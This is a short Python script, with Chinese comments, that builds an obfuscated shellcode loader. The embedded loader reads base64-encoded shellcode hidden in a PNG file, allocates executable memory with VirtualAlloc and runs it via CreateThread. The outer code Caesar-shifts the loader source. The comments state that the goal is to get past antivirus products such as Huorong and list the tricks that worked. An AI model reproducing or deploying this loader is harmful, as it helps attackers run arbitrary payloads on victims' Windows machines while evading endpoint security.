if __name__ == "__main__":
    # 如果直接执行shellcode火绒都能检测到，现在把shellcode先定义为常量，然后通过循环读取。试了一下其实也可以分4段aes加密，然后解密组合执行，但是太麻烦了
    # 之前直接把shellcodebase64编码直接放在源码里，杀软过不去，现在让他从图片中读取。
    # loader好像在申请内存时，开头新增几个偏移量也能过杀软
    content = r"""
import base64
import ctypes
import codecs

   

with open("Mdongnb.png", "rb") as f:
    encoded_data = f.read()

decoded_data = base64.b64decode(encoded_data)
data_buffer = bytearray(codecs.escape_decode(decoded_data)[0])

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

allocated_memory_address = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                               ctypes.c_int(len(data_buffer)),
                                                               ctypes.c_int(0x3000),
                                                               ctypes.c_int(0x40))
buffer = (ctypes.c_char * len(data_buffer)).from_buffer(data_buffer)

ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(allocated_memory_address),
    buffer,
    ctypes.c_int(len(data_buffer))
)

created_thread_handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(allocated_memory_address),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(created_thread_handle), ctypes.c_int(-1))
"""

    shift = 3  # 偏移量

    # 加密：将每个字符按照偏移量向右移动

    encrypted_content = ""
    for char in content:
        if char.isalpha():
            char_code = ord(char)
            if char.islower():
                encrypted_char = chr((char_code - ord('a') + shift) % 26 + ord('a'))
            else:
                encrypted_char = chr((char_code - ord('A') + shift) % 26 + ord('A'))
        else:
            encrypted_char = char
        encrypted_content += encrypted_char

    print("Encrypted content:", encrypted_content)
